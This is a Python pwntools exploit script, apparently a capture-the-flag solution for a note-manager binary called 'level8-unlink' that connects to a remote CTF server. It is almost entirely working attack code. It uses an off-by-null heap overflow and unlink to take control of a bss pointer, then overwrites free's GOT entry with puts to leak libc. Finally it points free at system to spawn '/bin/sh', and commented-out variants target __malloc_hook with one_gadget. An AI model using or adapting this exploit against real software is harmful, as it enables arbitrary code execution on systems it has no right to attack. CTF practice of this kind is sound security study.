#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./level8-unlink"
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team", 22508)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()


def addnote(size):
    r.sendlineafter(">> ","1")
    r.sendlineafter("Size:",str(size))

def deletenote(nid):
    r.sendlineafter(">> ", "3")
    r.sendlineafter("Input your id:", str(nid))


def editnote(nid,content):
    r.sendlineafter(">> ","2")
    r.sendlineafter("id:",str(nid))
    r.sendafter("Content:", content)


addnote(20) # 0
addnote(20) # 1

# off by null and unlink
addnote(0x108) # A-> 2
addnote(0x68)  # B-> 3
addnote(0xf8) # C-> 4

deletenote(2)
content_B = 'a'*0x60 + p64(0x110 + 0x70) 
editnote(3, content_B) 

deletenote(4)
deletenote(3)
length = 0x110 + 0x70 + 0x100
addnote(length) #2

bss_block = 0x6020a5 - 0x8
payload = 'a'*0x108 + p64(0x70 +1) + p64(bss_block)
payload += '\n'
editnote(2, payload)

addnote(0x68) #3
addnote(0x68) #4


# # off by null and unlink -2 round
# addnote(0x108) # A-> 5
# addnote(0x68)  # B-> 6
# addnote(0xf8) # C-> 7

# deletenote(5)
# content_B = 'a'*0x60 + p64(0x110 + 0x70) 
# editnote(6, content_B) 

# deletenote(7)
# deletenote(6)
# length = 0x110 + 0x70 + 0x100
# addnote(length) #5


# now 4 has the superpower -> on bss_block 泄露libc
free_pos = 0x602018
puts_pos = 0x602020
puts_plt = 0x4006B0
payload = 'a'*3 + 'a'*0x10 + p64(free_pos) + p64(puts_pos) + '\n'
editnote(4, payload)
editnote(0, p64(puts_plt)[:7]+'\n') # 注意，输8个会覆盖后面的
deletenote(1) #leak

puts_addr = r.recv(6)
puts_addr = u64(puts_addr+'\x00'*2)
libc.address = puts_addr - libc.sym['puts']

print hex(libc.address)
system = libc.sym['system']
#one_gadget = libc.address + 0xf02a4 #0xf1147#0x45216#0x4526a 
#malloc_block = libc.sym['__malloc_hook'] -0x23 

addnote(0x28) #1
editnote(0, p64(system)[:7]+'\n') # 注意，输8个会覆盖后面的
editnote(1, '/bin/sh\x00\n')

deletenote(1)

# # 改malloc_hook
# payload2 = 'a'*0x108 + p64(0x70 +1) + p64(malloc_block)
# payload2+= '\n'
# editnote(5,payload2)

# addnote(0x68) #1
# addnote(0x68) #6 -> malloc_block

# payload2 = 'a'*19 + p64(one_gadget) + '\n'
# editnote(6,payload2)


r.interactive()

'''
0. make UAF   
1. open chunck on bss, revise pool[0] to free_table, pool[1] to puts's got
2. revise free to puts_plt 
3. let some pool_addr be on libc, free it get the libc_addr
4. revise chunck, malloc get chunck near malloc_hook
5. trigger error
'''

'''
# off by null and unlink -3 round
addnote(0x108) # A-> 6
addnote(0x58)  # B-> 7
addnote(0xf8) # C-> 8

deletenote(6)
content_B = 'a'*0x50 + p64(0x110 + 0x60)
editnote(7, content_B)

deletenote(8)
deletenote(7)
length = 0x110 + 0x60 + 0x100
addnote(length) #6
'''
